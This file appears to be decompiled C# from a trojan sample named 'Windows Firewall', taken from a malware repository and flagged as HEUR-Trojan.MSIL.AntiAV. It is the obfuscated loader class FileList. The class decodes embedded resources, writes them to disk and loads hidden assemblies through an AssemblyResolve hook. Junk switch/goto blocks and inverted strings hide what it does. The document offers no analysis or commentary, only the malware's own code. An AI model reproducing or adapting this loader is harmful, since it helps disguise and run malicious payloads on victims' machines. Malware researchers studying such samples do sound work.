// Decompiled with JetBrains decompiler
// Type: WindowsFirewall.FileList
// Assembly: Windows Firewall, Version=12.5.2.3, Culture=neutral, PublicKeyToken=null
// MVID: B2F50818-876B-4F01-AE88-291FA22C03A1
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan.MSIL.AntiAV.gen-0a7f9a4a2ff6257feb79223e3432cef859eda0b8e5738450449fd016eb059f70.exe

using System;
using System.Collections;
using System.IO;
using System.Reflection;

namespace WindowsFirewall
{
  internal class FileList
  {
    private static readonly Hashtable currentColor = DialogSettings.SelectToolbox();
    private static readonly Hashtable generatorPosition = DialogSettings.SelectToolbox();

    internal static void SelectToolbox()
    {
      char[] currentColor1 = SymbolSite.SelectToolbox((object) "");
      for (int index = 0; index < currentColor1.Length; ++index)
        currentColor1[index] = (char) ~(ushort) currentColor1[index];
label_3:
      switch (7)
      {
        case 0:
          goto label_3;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (FileList.SelectToolbox);
          }
          string[] strArray = ReferenceFactory.SelectToolbox((object) PageSettings.SelectToolbox(currentColor1), new string[1]
          {
            AspectDesigner.SelectToolbox(761)
          }, StringSplitOptions.RemoveEmptyEntries);
          if (strArray != null)
          {
label_7:
            switch (3)
            {
              case 0:
                goto label_7;
              default:
                if (strArray.Length >= 0)
                {
label_9:
                  switch (3)
                  {
                    case 0:
                      goto label_9;
                    default:
                      for (int index = 0; index < strArray.Length; index += 2)
                      {
                        if (BuilderDictionary.SelectToolbox((object) strArray[index + 1], AspectDesigner.SelectToolbox(766)))
                        {
label_12:
                          switch (4)
                          {
                            case 0:
                              goto label_12;
                            default:
                              try
                              {
                                Assembly currentColor2 = AspectContext.SelectToolbox();
                                string currentColor3 = MenuItemResolver.SelectToolbox(BitmapDictionary.SelectToolbox(StreamProvider.SelectToolbox((object) currentColor2)), strArray[index]);
                                if (!CommandConverter.SelectToolbox(currentColor3))
                                {
label_14:
                                  switch (2)
                                  {
                                    case 0:
                                      goto label_14;
                                    default:
                                      foreach (string str in TextFileLoader.SelectToolbox((object) currentColor2))
                                      {
                                        if (DeviceInfo.SelectToolbox(str, strArray[index + 1]))
                                        {
label_17:
                                          switch (3)
                                          {
                                            case 0:
                                              goto label_17;
                                            default:
                                              Stream stream = ClientService.SelectToolbox((object) currentColor2, str);
                                              byte[] generatorPosition = IconType.SelectToolbox(97L, stream);
                                              FileStream currentColor4 = ActionContext.SelectToolbox(currentColor3, FileMode.Create, FileAccess.Write);
                                              try
                                              {
                                                ControlOptions.SelectToolbox((object) currentColor4, generatorPosition, 0, generatorPosition.Length);
                                              }
                                              finally
                                              {
                                                if (currentColor4 != null)
                                                {
label_21:
                                                  switch (3)
                                                  {
                                                    case 0:
                                                      goto label_21;
                                                    default:
                                                      ResourceSet.SelectToolbox((object) currentColor4);
                                                      break;
                                                  }
                                                }
                                              }
                                              ContextToken.SelectToolbox((object) stream);
                                              continue;
                                          }
                                        }
                                      }
label_27:
                                      switch (1)
                                      {
                                        case 0:
                                          goto label_27;
                                        default:
                                          continue;
                                      }
                                  }
                                }
                                else
                                  continue;
                              }
                              catch
                              {
                                continue;
                              }
                          }
                        }
                        else
                          AspectSite.SelectToolbox((object) FileList.generatorPosition, (object) strArray[index], (object) strArray[index + 1]);
                      }
label_32:
                      switch (6)
                      {
                        case 0:
                          goto label_32;
                      }
                      break;
                  }
                }
                else
                  break;
            }
          }
          DirectoryInvoker.SelectToolbox((object) FormStream.SelectToolbox(), new ResolveEventHandler(FileList.SelectToolbox));
          break;
      }
    }

    private static string SelectToolbox(
      byte[] currentColor,
      string generatorPosition,
      string nextData,
      string messageHandle)
    {
      generatorPosition = MenuItemResolver.SelectToolbox(LineManager.SelectToolbox(), generatorPosition);
      string currentColor1 = MenuItemResolver.SelectToolbox(generatorPosition, QueueProvider.SelectToolbox(nextData, messageHandle));
      if (!CommandConverter.SelectToolbox(currentColor1))
      {
label_1:
        switch (5)
        {
          case 0:
            goto label_1;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (FileList.SelectToolbox);
            }
            ToolbarInfo.SelectToolbox(generatorPosition);
            FileStream currentColor2 = ActionContext.SelectToolbox(currentColor1, FileMode.Create, FileAccess.Write);
            ControlOptions.SelectToolbox((object) currentColor2, currentColor, 0, currentColor.Length);
            ContextToken.SelectToolbox((object) currentColor2);
            break;
        }
      }
      return currentColor1;
    }

    private static Assembly SelectToolbox(
      object currentColor,
      ResolveEventArgs generatorPosition)
    {
      Hashtable currentColor1;
      EditorQueue.SelectToolbox((object) (currentColor1 = FileList.currentColor));
      try
      {
        Assembly nextData1 = (Assembly) null;
        string str1 = OptionsContext.SelectToolbox((object) generatorPosition);
        string str2 = string.Empty;
        IEnumerator currentColor2 = DriveFactory.SelectToolbox((object) StoreEditor.SelectToolbox((object) FileList.generatorPosition));
        try
        {
          while (QueueLoader.SelectToolbox((object) currentColor2))
          {
            string str3 = (string) MenuItemEditor.SelectToolbox((object) currentColor2);
            if (BuilderDictionary.SelectToolbox((object) str3, str1))
            {
label_4:
              switch (4)
              {
                case 0:
                  goto label_4;
                default:
                  if (false)
                  {
                    // ISSUE: method reference
                    RuntimeMethodHandle runtimeMethodHandle = __methodref (FileList.SelectToolbox);
                  }
                  nextData1 = Editor.SelectToolbox((object) FileList.currentColor, (object) str3) as Assembly;
                  if ((object) nextData1 != null)
                  {
label_8:
                    switch (4)
                    {
                      case 0:
                        goto label_8;
                      default:
                        return nextData1;
                    }
                  }
                  else
                  {
                    str2 = Editor.SelectToolbox((object) FileList.generatorPosition, (object) str3) as string;
                    goto label_17;
                  }
              }
            }
          }
label_12:
          switch (7)
          {
            case 0:
              goto label_12;
          }
        }
        finally
        {
          if (currentColor2 is IDisposable currentColor3)
          {
label_14:
            switch (1)
            {
              case 0:
                goto label_14;
              default:
                ResourceSet.SelectToolbox((object) currentColor3);
                break;
            }
          }
        }
label_17:
        if (DialogContext.SelectToolbox((object) str2) == 0)
        {
label_18:
          switch (5)
          {
            case 0:
              goto label_18;
            default:
              return (Assembly) null;
          }
        }
        else
        {
          Assembly currentColor4 = AspectContext.SelectToolbox();
          foreach (string str4 in TextFileLoader.SelectToolbox((object) currentColor4))
          {
            if (DeviceInfo.SelectToolbox(str4, str2))
            {
label_22:
              switch (2)
              {
                case 0:
                  goto label_22;
                default:
                  byte[] currentColor5 = IconType.SelectToolbox(97L, ClientService.SelectToolbox((object) currentColor4, str4));
                  byte[] generatorPosition1 = (byte[]) null;
                  try
                  {
                    str2 = QueueProvider.SelectToolbox(str2, AspectDesigner.SelectToolbox(769));
                    foreach (string str5 in TextFileLoader.SelectToolbox((object) currentColor4))
                    {
                      if (DeviceInfo.SelectToolbox(str5, str2))
                      {
label_26:
                        switch (3)
                        {
                          case 0:
                            goto label_26;
                          default:
                            generatorPosition1 = IconType.SelectToolbox(97L, ClientService.SelectToolbox((object) currentColor4, str5));
                            continue;
                        }
                      }
                    }
label_30:
                    switch (6)
                    {
                      case 0:
                        goto label_30;
                    }
                  }
                  catch (Exception ex)
                  {
                  }
                  bool flag = false;
                  try
                  {
                    if (generatorPosition1 == null)
                    {
label_34:
                      switch (4)
                      {
                        case 0:
                          goto label_34;
                        default:
                          nextData1 = ProcessStack.SelectToolbox(currentColor5);
                          break;
                      }
                    }
                    else
                    {
                      try
                      {
                        nextData1 = FileScope.SelectToolbox(currentColor5, generatorPosition1);
                      }
                      catch (Exception ex)
                      {
                        nextData1 = ProcessStack.SelectToolbox(currentColor5);
                      }
                    }
                  }
                  catch (FileLoadException ex)
                  {
                    flag = true;
                  }
                  catch (BadImageFormatException ex)
                  {
                    flag = true;
                  }
                  if (flag)
                  {
label_41:
                    switch (6)
                    {
                      case 0:
                        goto label_41;
                      default:
                        string nextData2 = FileList.SelectToolbox(str1);
                        string currentColor6 = FileList.SelectToolbox(currentColor5, str2, nextData2, AspectDesigner.SelectToolbox(772));
                        if (generatorPosition1 != null)
                        {
label_43:
                          switch (6)
                          {
                            case 0:
                              goto label_43;
                            default:
                              FileList.SelectToolbox(currentColor5, str2, nextData2, AspectDesigner.SelectToolbox(781));
                              break;
                          }
                        }
                        nextData1 = AssistantDesigner.SelectToolbox(currentColor6);
                        break;
                    }
                  }
                  AspectSite.SelectToolbox((object) FileList.currentColor, (object) str1, (object) nextData1);
                  return nextData1;
              }
            }
          }
label_49:
          switch (6)
          {
            case 0:
              goto label_49;
            default:
              return (Assembly) null;
          }
        }
      }
      finally
      {
        ConditionOptions.SelectToolbox((object) currentColor1);
      }
    }

    private static string SelectToolbox(string currentColor)
    {
      int nextData = FormDesigner.SelectToolbox((object) currentColor, ',');
      if (nextData >= 0)
      {
label_1:
        switch (5)
        {
          case 0:
            goto label_1;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (FileList.SelectToolbox);
            }
            currentColor = ProcessProvider.SelectToolbox((object) currentColor, 0, nextData);
            break;
        }
      }
      return currentColor;
    }
  }
}
